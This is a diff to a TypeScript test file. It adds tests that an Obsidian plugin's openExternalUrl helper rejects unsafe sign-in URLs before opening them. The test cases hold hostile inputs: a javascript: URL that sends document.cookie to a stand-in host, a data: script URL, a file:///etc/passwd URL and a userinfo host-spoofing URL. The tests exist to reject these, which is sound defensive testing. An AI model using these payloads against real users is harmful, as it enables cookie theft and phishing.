@@ -6,6 +6,7 @@ import {
   getBedrockAuthUiState,
   runBedrockDeviceAuth,
   runBedrockSignOut,
+  openExternalUrl,
   type BedrockDevicePrompt,
 } from '../../ui/bedrock-auth-controls';
 
@@ -84,7 +85,7 @@ describe('copy + sign-out delegation', () => {
     expect(clipboard.writeText).toHaveBeenCalledWith('ABCD-EFGH');
   });
 
-  it('sign-out keeps codex semantics: busy lock, confirm gate, error path', async () => {
+  it('sign-out: busy lock, confirm gate, error path', async () => {
     const calls: string[] = [];
     await runBedrockSignOut({
       isBusy: () => false,
@@ -97,5 +98,96 @@ describe('copy + sign-out delegation', () => {
       render: vi.fn(),
     });
     expect(calls).toEqual(['confirm', 'signOut']);
+  });
+});
+
+/**
+ * `openExternalUrl` is handed `verificationUriComplete` — a field lifted
+ * straight out of an OIDC response body — and passes it to `window.open`.
+ * An unvalidated remote string there turns a sign-in button into arbitrary
+ * navigation, so the two rules that stand between the two are pinned here.
+ */
+describe('openExternalUrl', () => {
+  function target() {
+    return { open: vi.fn<(url: string, target: string, features: string) => unknown>() };
+  }
+
+  it('opens an https URL with noopener,noreferrer', () => {
+    const win = target();
+
+    openExternalUrl(win, 'https://device.sso.us-east-1.amazonaws.com/?user_code=ABCD-EFGH');
+
+    // `noopener` is not cosmetic: without it the opened page gets a live
+    // `window.opener` handle back into the Obsidian renderer.
+    expect(win.open).toHaveBeenCalledWith(
+      'https://device.sso.us-east-1.amazonaws.com/?user_code=ABCD-EFGH',
+      '_blank',
+      'noopener,noreferrer',
+    );
+  });
+
+  // A tenant's Identity Center start domain is a legitimate device page and
+  // is deliberately NOT on the egress allowlist, so the check must not be a
+  // host allowlist — it would break the sign-in it protects.
+  it('opens a tenant start-domain device page', () => {
+    const win = target();
+
+    openExternalUrl(win, 'https://d-1234567890.awsapps.com/start/#/device');
+
+    expect(win.open).toHaveBeenCalledTimes(1);
+  });
+
+  it.each([
+    ['javascript:', 'javascript:fetch("https://evil.example/"+document.cookie)'],
+    ['data:', 'data:text/html,<script>alert(1)</script>'],
+    ['file:', 'file:///etc/passwd'],
+    ['cleartext http:', 'http://device.sso.us-east-1.amazonaws.com/'],
+  ])('refuses a %s URL', (_label, url) => {
+    const win = target();
+
+    expect(() => openExternalUrl(win, url)).toThrow(/Refusing to open/);
+    expect(win.open).not.toHaveBeenCalled();
+  });
+
+  it('refuses a URL that disguises its host with userinfo', () => {
+    const win = target();
+
+    expect(() => openExternalUrl(win, 'https://device.sso.us-east-1.amazonaws.com@evil.example/'))
+      .toThrow(/credentials/);
+    expect(win.open).not.toHaveBeenCalled();
+  });
+
+  it('refuses a URL it cannot parse', () => {
+    const win = target();
+
+    expect(() => openExternalUrl(win, 'not a url')).toThrow(/could not be parsed/);
+    expect(win.open).not.toHaveBeenCalled();
+  });
+
+  // The device flow treats an openExternal throw as a failed login: it
+  // cancels the prompt and surfaces the message rather than hanging.
+  it('surfaces through runBedrockDeviceAuth as a failed login', async () => {
+    const win = target();
+    const cancel = vi.fn();
+    const showError = vi.fn();
+    await runBedrockDeviceAuth({
+      beginLogin: async () => ({
+        userCode: 'ABCD-EFGH',
+        verificationUri: 'https://v',
+        verificationUriComplete: 'javascript:alert(1)',
+        complete: Promise.resolve('done'),
+        cancel,
+      }) as unknown as BedrockDevicePrompt,
+      openExternal: (url) => { openExternalUrl(win, url); },
+      setPrompt: vi.fn(),
+      showError,
+      setBusy: vi.fn(),
+      setReady: vi.fn(),
+      render: vi.fn(),
+    });
+
+    expect(win.open).not.toHaveBeenCalled();
+    expect(cancel).toHaveBeenCalledTimes(1);
+    expect(showError).toHaveBeenCalledTimes(1);
   });
 });
